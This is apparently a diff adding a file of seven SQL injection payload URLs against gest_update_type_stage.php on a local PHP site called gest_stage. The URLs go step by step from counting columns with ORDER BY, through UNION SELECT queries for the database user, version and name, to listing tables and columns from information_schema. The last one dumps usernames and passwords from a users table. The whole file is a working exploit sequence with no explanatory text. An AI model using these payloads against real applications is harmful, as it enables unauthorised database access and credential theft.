@@ -1,0 +1,7 @@
+http://local.gest_stage/gest_update_type_stage.php?id=1+order+by+2
+http://local.gest_stage/gest_update_type_stage.php?id=-1+union+select+1,user()
+http://local.gest_stage/gest_update_type_stage.php?id=-1+union+select+1,version()
+http://local.gest_stage/gest_update_type_stage.php?id=-1+union+select+1,database()
+http://local.gest_stage/gest_update_type_stage.php?id=-1+union+all+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--
+http://local.gest_stage/gest_update_type_stage.php?id=-1+union+all+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name=0x7573657273+AND+TABLE_SCHEMA=0x676573745f7374616765--
+http://local.gest_stage/gest_update_type_stage.php?id=-1+union+all+select+1,concat(id,0x3a,username,0x3a,password)+from+users
